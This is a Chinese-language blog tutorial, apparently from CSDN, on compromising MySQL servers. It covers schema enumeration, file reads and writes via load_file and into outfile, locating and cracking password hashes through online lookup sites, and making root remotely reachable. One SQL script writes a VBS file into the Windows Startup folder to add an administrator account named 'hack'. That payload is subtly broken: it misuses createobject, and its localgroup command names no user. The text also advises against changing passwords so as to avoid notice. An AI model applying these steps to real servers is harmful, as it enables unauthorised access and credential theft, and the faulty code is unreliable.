**目录**

[MySQL数据库](#t0)

[mysql中比较常用的一些函数](#t1)

[MySQL数据库中的文件操作函数(load\_file()、into outfile、into dumpfile)](#t2)

[判断MySQL数据库是否存在SQL注入](#t3)

[MySQL数据库文件结构](#t4)

[MySQL数据库密码破解](#t5)

[MySQL UDF提权](#t6)

[MySQL启动项提权](#t7)

[MySQL数据库允许其他主机连接](#t8)

[MySQL数据库获取权限思路](#t9)

* * *

MySQL数据库
--------

**[MySQL](https://baike.baidu.com/item/MySQL/471251)**是一种开放源代码的[关系型数据库](https://so.csdn.net/so/search?q=%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020)管理系统（RDBMS），使用最常用的数据库管理语言——结构化查询语言（SQL）进行数据库管理。

mysql中的注释符

*   单行注释：#  
*   多行注释：/\*\*/ 

![](https://img-blog.csdnimg.cn/2020022920460968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

好奇的是竟然这样也可以查询出数据

![](https://img-blog.csdnimg.cn/2020030718005338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

5.0以下是多用户单操作，5.0以上是多用户多操做。

MySQL中默认的数据库：

*   information\_schema
*   performance\_schema
*   mysql
*   test

MySQL特有的数据库是：information\_schema

*   在MySQL5.0以下，没有information\_schema这个系统数据库，无法列表名等，只能暴力跑表名。
*   在MySQL5.0以上，MySQL中默认添加了一个名为 information\_schema 的数据库，该数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。

**information\_schema 数据库中三个很重要的表：**

*   information\_schema.schemata:  该数据表存储了mysql数据库中的所有数据库的库名
*   information\_schema.tables：     该数据表存储了mysql数据库中的所有数据表的表名
*   information\_schema.columns:    该数据表存储了mysql数据库中的所有列的列名

**information\_schema.tables** 存储了数据表的元数据信息，下面对常用的字段进行介绍：

*   table\_schema: 记录数据库名
*   table\_name: 记录数据表名
*   table\_rows: 关于表的粗略行估计
*   data\_length : 记录表的大小（单位字节）

当尝试删除该 information\_schema 数据库时，会爆出以下的错误！

![](https://img-blog.csdnimg.cn/20181215113337683.png)i

关于这几个表的一些语法：

```
// 通过这条语句可以得到所有的数据库名        
select schema_name from information_schema.schemata limit 0,1       
// 通过这条语句可以得到所有的数据表名      
select table_name from information_schema.tables limit 0,1      
// 通过这条语句可以得到指定security数据库中的所有表名      
select table_name from information_schema.tables where table_schema='security'limit 0,1       
// 通过这条语句可以得到所有的列名      1
select column_name from information_schema.columns limit 0,1      1
// 通过这条语句可以得到指定数据库security中的数据表users的所有列名      1
select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1       1
//通过这条语句可以得到指定数据表users中指定列password的数据(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)      1
select password from users limit 0,1
```


查看当前用户的权限

```
select * from mysql.user where user = substring_index(user(), '@', 1) ;
```


 ![](https://img-blog.csdnimg.cn/20190922195600816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### **mysql中比较常用的一些函数**

*   version()： 查询数据库的版本          
*   user()：查询数据库的使用者       
*   database()：数据库
*   system\_user()：系统用户名
*   session\_user()：连接数据库的用户名
*   current\_user：当前用户名
*   load\_file()：读取本地文件
*   @@datadir：读取数据库路径
*   @@basedir：mysql安装路径
*   @@version\_compile\_os：查看操作系统
*   CAST( 字段名 as 转换的类型)
*   IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。

> ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii("a")=97

> length(str) : 返回给定字符串的长度，如  length("string")=6

> substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如  substr("chinese",3,2)="in"
> 
> substr()、stbstring()、mid()  三个函数的用法、功能均一致

> concat(username)：将查询到的username连在一起，默认用逗号分隔
> 
> concat(str1,'\*',str2)：将字符串str1和str2的数据查询到一起，中间用\*连接
> 
> group\_concat(username) ：将username数据查询在一起，用逗号连接

> limit 0,1：查询第1个数        limit  1,1： 查询第2个数             limit  n,1： 查询第n+1个数

### MySQL数据库中的文件操作函数(load\_file()、into outfile、into dumpfile)

*   load\_file()  ：读取指定文件
*   into outfile ：将查询的数据写入文件中
*   into dumpfile：将查询的数据写入文件中(只能写入一行数据)

首先，文件类操作函数都与 **secure\_file\_priv** 的值有关，secure\_file\_priv 是用来限制 load\_file()、into  outfile、into dumpfile 函数在哪个目录下拥有上传或者读取文件的权限。secure\_file\_priv的值默认为NULL。

```
show global variables like 'secure%';      
     当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权      
     当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权      
     当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权
```


 ![](https://img-blog.csdnimg.cn/20200102214826230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

secure\_file\_priv 的值在 MySQL 数据库的安装目录的 my.ini 文件中配置。如果 my.ini 的 \[mysqld\] 下没有这行，我们可以手动加

![](https://img-blog.csdnimg.cn/2019092223262749.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

into outfile写数据到文件、load\_file()读取指定的文件

![](https://img-blog.csdnimg.cn/20200102215616289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

into dumpfile只能写入一行数据

![](https://img-blog.csdnimg.cn/20200102215803179.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 判断MySQL数据库是否存在SQL注入

传送门——>  [SQL注入漏洞详解](https://blog.csdn.net/qq_36119192/article/details/81987834)

### MySQL数据库文件结构

**MYSQL数据库文件类型**

MySQL数据库文件共有 frm 、MYD 和 MYI 三种文件，.frm 是描述表结构的文件，.MYD 是表的数据文件，.MYI 是表数据文件中任何索引的数据树。一般是单独存在一个文件夹中，默认是在路径“[C:\\Program Files\\MySQL\\MySQL Server 5.7\\data](https://bbs.ichunqiu.com/thread-28934-1-1.html?from=bkyl)”下。在MySQL数据库中所有设置默认都保存在“[C:\\Program Files\\MYSQL\\MYSQL Server 5.7\\data\\](https://bbs.ichunqiu.com/thread-28934-1-1.html?from=bkyl)mysql”中，也就是安装程序的data目录下，有关用户一共有三个文件即user.frm、user.MYD和user.MYI，MYSQL数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。

![](https://img-blog.csdnimg.cn/20190916194553459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

user.MYD文件

![](https://img-blog.csdnimg.cn/20190916194711876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### MySQL数据库密码破解

MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权限后即可直接从数据库连接文件中读取，例如 asp 代码中的conn.asp数据库连接文件，在该文件中一般都包含有数据库类型，物理位置，用户名和密码等信息；而在MySQL中即使获取了某一个用户的数据库用户（root用户除外）的密码，也仅仅只能操作某一个用户的数据库中的数据。

在实际攻防过程中，在获取Webshell的情况下，是可以直接下载MySQL数据库中保留用户的user.MYD文件，该文件中保存的是MySQL数据库中所有用户对应的数据库密码，只要能够破解这些密码那么就可以正大光明的操作这些数据，虽然网上有很多修改MySQL数据库用户密码的方法，却不可取，因为修改用户密码的事情很容易被人发现！

![](https://img-blog.csdnimg.cn/20190915201018257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**MySQL用户密码加密方式**

MySQL数据库的认证密码有两种方式，MySQL 4.1版本之前是MySQL323加密，MySQL 4.1及其之后的版本都是MySQL SHA1加密。因为如今绝大部分网站都是用的4.1之后的版本，所以我们接下来只讨论使用MySQL SHA1加密方式的密码。MySQL中的 password(str) 函数就是对其进行加密的。该函数会生成41位的字符串，但是 \* 是不计入到密码中的，所以真正有效位数是后面的40位。

当 MySQL<8.0 时，是用 password() 函数对密码加密。而在 MySQL> 8.0时，MySQL取消了 password() 函数。

![](https://img-blog.csdnimg.cn/20190915201420439.png)

在MySQL中，用户密码存放在 mysql 数据库的 user 表里

*   当MySQL< 5.7，密码字段在mysql数据库的user表的password字段里
*   当MySQL >= 5.7，密码字段在mysql数据库的user表的authentication\_string字段里

当MySQL< 5.7时：

![](https://img-blog.csdnimg.cn/20191105224956350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

当MySQL>= 5.7时：

![](https://img-blog.csdnimg.cn/20200429174806276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**破解MySQL用户密码**

例如破解root用户的密码：81F5E21E35407D884A6CD4A731AEBFB6AF209E1B

在线破解网站：[https://cmd5.com/](https://cmd5.com/)   、  [https://www.somd5.com/](https://www.somd5.com/)

![](https://img-blog.csdnimg.cn/20190916195825876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20190916200133887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### [MySQL UDF提权](https://blog.csdn.net/qq_36119192/article/details/84863268)

[MySQL UDF提权执行系统命令](https://blog.csdn.net/qq_36119192/article/details/84863268)

### MySQL启动项提权

MySQL启动项[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)的前提也是 secure\_file\_priv 的值为空，然后利用 intou outfile 写入功能，在目标服务器的开机自启目录下写入木马，然后用其他办法使服务器重启，从而获得权限。由于需要使目标服务器重启，所以在实战利用中并不常用。

```
create table a(cmd text);      
insert into a values("set wshshell=createobject(""wscript.shell"",0)");      
insert into a values("set wshshell=createobject(""cmd.exe /c net user hack Password@ /add"",0)");      
insert into a values("set wshshell=createobject(""cmd.exe /c net localgroup administrators /add"",0)");      
select*from a into outfile"C:\\Users\\用户名\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\1.vbs";
```


![](https://img-blog.csdnimg.cn/20200106144124747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### MySQL数据库允许其他主机连接

![](https://img-blog.csdnimg.cn/20200222181254567.png)

```
use mysql;      
update user set host='%' where user='root';      
flush privileges;       
如果以上命令执行失败,可以执行以下命令：      
select host,user from mysql.user;      
delete FROM mysql.user  where host="127.0.0.1";      
delete FROM mysql.user  where host="::1";
```


![](https://img-blog.csdnimg.cn/20200222181827668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200222205103541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### MySQL数据库获取权限思路

如何通过MySQL数据库注入执行系统命令呢？

如果是普通用户，则无法执行系统命令。

如果是root用户：

*   爆破出root用户对于的密码，并解析得到明文，并且目标主机3306端口开着允许外部连接，连接上之后，可以利用UDF提权、启动项提权。
*   当无法远程连接该数据库，只有注入点的话。如果知道网站的绝对路径，可以通过写入木马进行提权。SQLMap里面的 --os-shell就是该原理

需要注意的是，以上的提权方法均需要into outfile具有可写的权限。也就是secure\_file\_priv的值需要为空。

相关文章：[常见的SQL语句](https://blog.csdn.net/qq_36119192/article/details/82875868)

                  [MySQL 详细学习笔记](https://mp.weixin.qq.com/s?__biz=MzU4ODU1MzAyNg==&mid=2247487135&idx=1&sn=df5578a023fd28f5209e58b10bc5ed5c&chksm=fdda40b2caadc9a431c12bfa1aa0017d5fd544d144ccd601ef676fe5218d1d774d9c7fb3a9fc&mpshare=1&scene=2&srcid=0904qBCj2KetPoxglGwLBeNX&sharer_sharetime=1567556120827&sharer_shareid=8626ff039152e52d5a81b31931d01223&from=timeline&clicktime=1567558602&key=deceac43f8ae7820d22d05f319bab9d62a908fcc45c3f5b62b862f91309970a822129420cb2810f1e418bec4c7a4c9c4d1c8a274ab9886fd9ab03ad1d1d24e4daa60c630aed2cdc58594020f7394e634&ascene=14&uin=MjIwMDQzNjQxOQ%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=Na%2BE8iw7YWCVWdz1SqD3Q1OUVEIrTdgHyMAStOVu12bkFyPlSb3142KTC3E2XABQ)